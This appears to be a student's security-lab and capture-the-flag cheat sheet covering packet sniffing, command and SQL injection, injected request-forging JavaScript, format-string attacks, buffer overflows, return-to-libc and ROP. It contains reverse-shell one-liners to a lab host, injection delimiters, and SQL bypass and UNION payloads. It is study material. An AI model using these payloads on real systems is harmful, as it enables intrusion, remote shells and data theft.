# General
Change Keyboard Layout: Settings -> Text Entry


# Network Security
Find docker network interface:	`ifconfig / docker network`
```python
cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
```
[Berkeley Packet Filters](https://www.ibm.com/docs/en/qsip/7.4?topic=queries-berkeley-packet-filters)

## ScaPy
```python
from scapy.all import *
pkt = sniff(iface="ifacename", filter="src host 10.9.0.5 and tcp dst port 23", prn=print_pkt)	# def print_pkt(pkt): ...
pkg = IP(dst="", src="", ttl=5)/ICMP(type=, code=, id=, seq=)/data
pkg = IP(...)/TCP(sport=, dport=, flags="", seq=, ack=)
pkt[IP].src
ptk.show()
```


# Web Security
## Command Injections
- Wait for incoming connections: `nc -lnv[k] 9090`
- Send to host: `echo text > /dev/tcp/127.0.0.1/9090`
- Initiate reverse shell: `/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1` / `nc -e /bin/bash host port`
- Delimiters to try:
	- ;
	- /n
	- &&, ||
	- ', ", `
	- $, \
- Command substitution:
	- \`whoami\`
	- $(whoami)

## SQL Injections
- `' or 1=1 --`
- ', ", \
- `1 UNION SELECT secret FROM secrets`
- `1 AND 1=0 UNION SELECT 1,2,3`
- `SELECT schema_name FROM information_schema.schemata`
- `SELECT table_name FROM information_schema.tables`
- Wildcards for `LIKE`:
	- match one: `_` / `?`
	- match one or more: `%`

## HTTP Verbs
- GET Request
```html
<script type="text/javascript">
	window.onload = function () {
		var sendurl="/sub1/sub2/site?var1=ab&var2=cd&var3=xy";
		var Ajax=new XMLHttpRequest();
		Ajax.open("GET", sendurl, true);
		Ajax.send();
	}
</script>
```
- POST Request
```html
<script type="text/javascript">
	window.onload = function() {
		var sendurl="/action/profile/edit";
		var contest="var1=ab&var2=cd&var3=xy";
		var Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);
	}
</script>
```


# Pwning
For `0xAABBCCDD` as String `"\xDD\xCC\xBB\xAA"`
`0x1234 = 0x00001234`

## Useful commands
```bash
echo `python3 -c "print('\x41')"`
python3 -c "print('\x41')" | command

objdump -d -M intel binaryFile

file binaryFile
checksec binaryFile
strings binaryFile
```


# GDB
Breakpoint:			`b main`
Adress of function:	`p/x functionName`
Content of adress:	`x 0x1234abcd`
Read "inside" adress:	`x/i 0x1234abcd`
Run with input:		`r < input_file`

## gdb-peda pattern search
`pattern create 50 pat50`
pattern search
Pattern buffer found at: ... size (...0x28...)

dissass main


# Format String
Print Hex value:							`%.8x`
Print String (takes adress as arg):			`%s`
Print empty chars:							`%210c`
Write number of printed symbols at adress:	`%n`
Use 64th argument:							`%64$.8x`

## Overwrite
1. Find position of buffer (for example 64)
2. Put adress of variable at beginning of buffer
3. After that write `"%210c%64$n"`, substitute 210 for decimal number of wanted hex value


# Bufferoverflow
1. find out how long until you overwrite the return adress / a function call
2. insert a pointer to the beginning of the buffer
3. put shellcode at the beginning of the buffer

## Return to Libc
2. find adress of `system()`, `exit()` and envoirenment variable `MYSHELL=/bin/sh`
3. but random stuff up to the return pointer (where EBP points to +4), then the adresses of `system()`, `exit()`, `MYSHELL=/bin/sh`


# ROP
Print all gadgets:
```python
from pwn import *
elf = context.binary = ELF('binaryFile')
rop = ROP(elf)
rop.gadgets
```
Get String Adress:
`r2 binaryFile` -> `izz` -> third column

## Generate ROP
```python
from pwn import *
elf = context.binary = ELF('binaryFile')
rop = ROP(elf)
rop.call(0x1234abcd, [0x5678efab])	# call a function with the given arguments (adress_of_system, [adress_of_/bin/sh])
rop.dump()
rop.chain()		# gives binary code without offset
```
